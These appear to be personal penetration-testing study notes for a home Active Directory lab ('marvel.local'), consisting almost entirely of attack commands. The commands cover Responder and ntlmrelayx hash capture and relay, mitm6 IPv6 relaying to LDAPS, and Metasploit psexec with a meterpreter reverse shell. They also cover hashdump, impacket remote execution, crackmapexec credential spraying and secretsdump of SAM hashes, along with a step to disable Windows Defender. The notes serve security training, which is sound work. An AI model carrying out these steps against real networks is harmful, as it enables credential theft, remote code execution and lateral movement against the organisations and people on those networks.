# Active Directory

## Hashcat

Cracking the NTLM hash:
```
hashcat.exe -m 5600 hashes.txt rockyou.txt -O
```

* Login to spiderman and fcastle machines. 
* AD is marvel.local 
* marvel fcastle should be admin. 
* Reboot both machines.

On kali:
```bash
sudo mousepad /etc/responder/Responder.conf
```

disable SMB and HTTP OFF:
```bash
SMB = Off
HTTP = Off
```

Run responder: 
```bash
sudo responder -I eth 0 
```

On Kali, scan spiderman machine:
```bash
nmap --script=smb2-security-mode.nse -p445 <IP-ADDRESS>/24 -Pn
```

Output target IP to `targets.txt`:
```bash
echo <TARGET-IP> > targets.txt
```

Run attack `ntlmrelayx`:
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

Login to Frank Castle machine:
Go to File explorer and go to network share and do this, replaceing `<HOST-IP>` with Kali VM IP:
```bash
\\<HOST-IP>
```
There should be hashes dumped.


```bash
ntlmrelayx.py -tf targets.txt -
```
To get shell, connect to file share again on windows machine.

```bash
nc 127.0.0.1 11000
```

```bash
shares
```


---

* IPv6 Attacks
* Gaining Shell Access
* Reviewing Attack Strategies

Run both of these scripts:
```bash
sudo mitm6 -d marvel.local
```

IPv6:
```bash
ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh wpad.marvel.local -l lootme
```

Go to the loot directory and you should see a bunch of files that have been collected.

Login to Frank Castle machine.

![[IPv6 Attacks Mitigation.png]]

Go to PUNISHER machine and disable Windows Defender.

**Gaining Shell Access:**

Using MetaSploit is the most detected:
```bash
msfconsole
```

```bash
search psexec
```

```bash
use exploit/windows/smb/psexec
```

```bash
options
```

Frank Castle IP:
```bash
set rhosts <TARGET-IP>
```

```bash
set smb fcastle
```

```bash
set smbpass Password1
```

```bash
set smbdomain MARVEL.local
```

```bash
options
```

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

```bash
options
```

```bash
show targets
```

```bash
set target 2
```

```bash
options
```

```bash
run
```

`meterpreter>` shell
```bash
help
```

```bash
getuid
```

```bash
hashdump
```

```bash
shell
```

```bash
whoami
```

```bash
hostname
```
Ctrl+C to terminate channel 1 and go back to meterpreter, Ctrl+Z to MetaSploit.

```bash
sessions
```

New tab:
```bash
psexec.py marvel.local/fcastle:Password@192.168.X.X
```

Shell:
```
C:\Windows\system32
```

```bash
smbexec.py marvel.local/fcastle:Password@192.168.X.X
```

```bash
wmiexec.py marvel.local/fcastle:Password@192.168.X.X
```

![[Attacking AD.png]]
[https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)

Pass the Password:
```bash
crackmapexec smb <ip/CIDR> -u <user> -H <hash>
```

```bash
sudo crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1
```
`MARVEL.local\fcastle:Password1 (Pwn3d!)`

```bash
sudo secretsdump.py MARVEL/fcastle:Password@192.168.138.145
```

Local SAM hashes.
```bash
sudo secretsdump.py MARVEL/<user>:@192.168.138.132
```

